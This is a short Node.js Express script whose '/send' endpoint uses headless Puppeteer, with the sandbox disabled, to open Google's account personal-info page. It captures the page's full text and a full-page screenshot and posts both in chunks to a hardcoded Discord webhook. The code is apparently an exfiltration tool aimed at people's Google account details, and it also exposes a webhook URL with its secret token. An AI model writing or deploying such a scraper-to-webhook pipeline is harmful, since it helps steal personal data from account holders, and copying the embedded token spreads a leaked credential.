const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));

// ===== CONFIG =====
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1459229880221700375/esk71z4kmwuwYOLByflofkjZra-deSo82CK0UogimXJbp0QKB13MLQ4wP3mm-yFrw6rj';
const TARGET_URL = 'https://myaccount.google.com/personal-info';
// ==================

app.get('/send', async (req, res) => {
    try {
        // Launch headless browser
        const browser = await puppeteer.launch({
            args: ['--no-sandbox', '--disable-setuid-sandbox'],
        });
        const page = await browser.newPage();
        await page.goto(TARGET_URL, { waitUntil: 'networkidle2' });

        // Get all text content from the page
        const pageText = await page.evaluate(() => {
            return document.body.innerText;
        });

        // Take full-page screenshot
        const screenshotBuffer = await page.screenshot({ fullPage: true });

        await browser.close();

        // Send text in chunks to Discord (Discord message limit 2000 chars)
        for (let i = 0; i < pageText.length; i += 1900) {
            const chunk = pageText.slice(i, i + 1900);
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: "```" + chunk + "```" }),
            });
        }

        // Send screenshot to Discord
        const form = new FormData();
        form.append('file', screenshotBuffer, 'screenshot.png');

        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            body: form,
        });

        res.send("Full text and screenshot sent to Discord!");
    } catch (err) {
        console.error(err);
        res.status(500).send("Error scraping page or sending to Discord");
    }
});

app.get('/', (req, res) => res.send("Text + Screenshot Scraper API running"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
